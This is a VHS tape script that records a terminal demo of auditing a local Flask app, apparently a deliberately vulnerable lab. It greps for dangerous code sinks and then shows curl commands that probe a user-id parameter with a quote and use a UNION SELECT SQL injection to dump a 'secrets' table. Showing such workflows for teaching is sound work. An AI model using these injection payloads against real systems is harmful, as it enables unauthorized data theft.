# VHS tape: renders demo.gif. Requires the container up on :5001.
#   vhs demo.tape
Output demo.gif
Set Shell bash
Set FontSize 16
Set Width 1100
Set Height 620
Set Theme "Catppuccin Mocha"
Set TypingSpeed 40ms

Type "# grep: find the sinks" Enter
Sleep 500ms
Type `grep -rnE "subprocess\.|\.execute\(|open\(|render_template_string\(|requests\.get" --include="*.py" flask_app/` Enter
Sleep 3s

Type "# trace: who calls get_user?" Enter
Sleep 500ms
Type `grep -n -B2 "get_user(uid)" flask_app/app.py` Enter
Sleep 3s

Type "# pwn: probe with a quote" Enter
Sleep 500ms
Type `curl -s "http://localhost:5001/user?id=1'" | head -c 200; echo` Enter
Sleep 2.5s

Type "# pwn: extract" Enter
Sleep 500ms
Type `curl -s "http://localhost:5001/user?id=1%20UNION%20SELECT%20id,name,value%20FROM%20secrets"` Enter
Sleep 4s
